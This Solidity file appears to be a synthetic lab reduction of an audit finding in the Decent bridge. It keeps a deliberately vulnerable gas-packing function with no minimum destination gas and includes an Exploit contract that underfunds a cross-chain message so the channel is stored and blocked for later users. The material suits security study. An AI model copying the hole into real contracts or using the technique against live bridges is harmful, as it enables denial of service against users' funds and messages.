// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Decent — [H-02] Missing min-gas checks on LayerZero adapter params
    (Code4rena 2024-01-decent; #30560)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: _getCallParams packs gasAmount = GAS_FOR_RELAY + _dstGasForCall
    with NO minimum on _dstGasForCall. A user (or attacker) can pass a tiny value
    so destination execution OOGs / fails; LayerZero then STORES the message and
    blocks the entire source→dest channel until it is cleared. Vulnerable gas
    packing preserved (@>). */

/// @dev Minimal LZ-style channel: one in-flight/stored slot per path; stored blocks next.
contract MockLzEndpoint {
    enum Status {
        None,
        Success,
        Stored
    }

    // path key = keccak(src, dst) → last message status
    mapping(bytes32 => Status) public pathStatus;
    uint256 public deliveredCount;
    uint256 public storedCount;

    event MessageResult(bytes32 path, Status status, bool executed);

    function _path(uint16 src, uint16 dst) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(src, dst));
    }

    /// @dev Deliver a message with `gasLimit` to `target` with `payload`.
    /// If path is already Stored, delivery is blocked (channel locked).
    function deliver(
        uint16 src,
        uint16 dst,
        address target,
        bytes memory payload,
        uint256 gasLimit
    ) external returns (bool) {
        bytes32 p = _path(src, dst);
        require(pathStatus[p] != Status.Stored, "channel blocked: prior message STORED");

        // Simulate destination execution with a hard gas cap.
        // If gasLimit is below the target's required minimum, treat as OOG failure.
        (bool ok,) = target.call{gas: gasLimit}(payload);
        if (!ok || gasleft() == 0) {
            // Uncaught errors (incl. OOG) → STORED, blocking future messages.
            pathStatus[p] = Status.Stored;
            storedCount += 1;
            emit MessageResult(p, Status.Stored, false);
            return false;
        }
        pathStatus[p] = Status.Success;
        deliveredCount += 1;
        emit MessageResult(p, Status.Success, true);
        return true;
    }

    function isBlocked(uint16 src, uint16 dst) external view returns (bool) {
        return pathStatus[_path(src, dst)] == Status.Stored;
    }
}

/// @dev Destination app that needs a non-trivial amount of gas (e.g. arbitrary call).
contract DestinationApp {
    uint256 public constant REQUIRED_GAS = 150_000;
    uint256 public executions;

    // Heavy-enough work that low gas limits fail.
    function onReceive(bytes calldata /*data*/) external {
        uint256 g0 = gasleft();
        // Burn ~120k gas of work so 101k total is insufficient.
        uint256 acc;
        for (uint256 i = 0; i < 800; i++) {
            acc += i;
        }
        require(g0 >= REQUIRED_GAS, "insufficient gas for destination work");
        executions += 1 + (acc == type(uint256).max ? 1 : 0); // keep acc live
    }
}

/// @dev Reduced DecentEthRouter._getCallParams gas packing (no min check).
contract DecentEthRouter {
    uint16 public constant PT_SEND_AND_CALL = 1;
    MockLzEndpoint public endpoint;
    DestinationApp public destApp;
    uint16 public constant SRC = 1;
    uint16 public constant DST = 2;

    constructor(address _endpoint, address _destApp) {
        endpoint = MockLzEndpoint(_endpoint);
        destApp = DestinationApp(_destApp);
    }

    function _getCallParams(uint64 _dstGasForCall)
        private
        pure
        returns (bytes memory adapterParams, uint256 gasAmount)
    {
        uint256 GAS_FOR_RELAY = 100000;
        gasAmount = GAS_FOR_RELAY + _dstGasForCall; // @> VULN: no minimum on _dstGasForCall — user can underfund destination gas
        // FIX: require(_dstGasForCall >= MIN_DST_GAS); and/or cap executor gas
        adapterParams = abi.encodePacked(PT_SEND_AND_CALL, gasAmount);
    }

    /// @dev bridgeWithPayload simplified: pack adapter gas and deliver via mock LZ.
    function bridgeWithPayload(uint64 _dstGasForCall, bytes memory additionalPayload)
        external
        returns (bool delivered)
    {
        (bytes memory adapterParams, uint256 gasAmount) = _getCallParams(_dstGasForCall);
        adapterParams; // packed for LZ; we use gasAmount directly in the mock
        bytes memory payload = abi.encodeWithSelector(DestinationApp.onReceive.selector, additionalPayload);
        delivered = endpoint.deliver(SRC, DST, address(destApp), payload, gasAmount);
    }

    function gasFor(uint64 _dstGasForCall) external pure returns (uint256) {
        uint256 GAS_FOR_RELAY = 100000;
        return GAS_FOR_RELAY + _dstGasForCall;
    }
}

contract Exploit {
    MockLzEndpoint public endpoint; // CREATE 1
    DestinationApp public destApp; // CREATE 2
    DecentEthRouter public router; // CREATE 3 — vulnerable gas packing

    constructor() {
        endpoint = new MockLzEndpoint();
        destApp = new DestinationApp();
        router = new DecentEthRouter(address(endpoint), address(destApp));
    }

    function run() external {
        // Malicious / mistaken user passes _dstGasForCall = 1000 → total gas 101_000.
        uint64 underfunded = 1000;
        require(router.gasFor(underfunded) == 101_000, "gas math");

        // First message underfunded → destination fails → STORED → channel blocked.
        bool ok = router.bridgeWithPayload(underfunded, bytes("attack"));
        require(!ok, "should fail destination");
        require(endpoint.isBlocked(1, 2), "channel must be STORED/blocked");
        require(endpoint.storedCount() == 1, "one stored");
        require(destApp.executions() == 0, "dest did not execute");

        // Subsequent legitimate, well-funded message cannot be delivered.
        bool ok2 = false;
        try router.bridgeWithPayload(uint64(200_000), bytes("honest")) returns (bool d) {
            ok2 = d;
        } catch {
            ok2 = false; // channel blocked reverts
        }
        require(!ok2, "honest message blocked");
        require(endpoint.isBlocked(1, 2), "still blocked");
        require(destApp.executions() == 0, "honest never landed");
        // Harm: permanent cross-chain channel DoS (STORED blocks all future msgs).
    }
}
